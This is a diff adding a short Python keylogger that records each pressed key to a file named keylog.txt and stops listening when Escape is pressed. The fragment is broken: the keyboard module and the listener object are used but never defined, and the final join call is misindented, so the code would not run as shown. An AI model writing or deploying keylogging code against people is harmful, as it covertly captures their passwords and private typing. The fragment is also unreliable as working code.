@@ -1,0 +1,19 @@
+
+
+log_file = "keylog.txt"
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as file:
+            file.write(f'{key.char}\n')
+    except AttributeError:
+        with open(log_file, "a") as file:
+            file.write(f'{key}\n')
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        # Stop listener
+        return False
+
+# Collect events until released
+    listener.join()
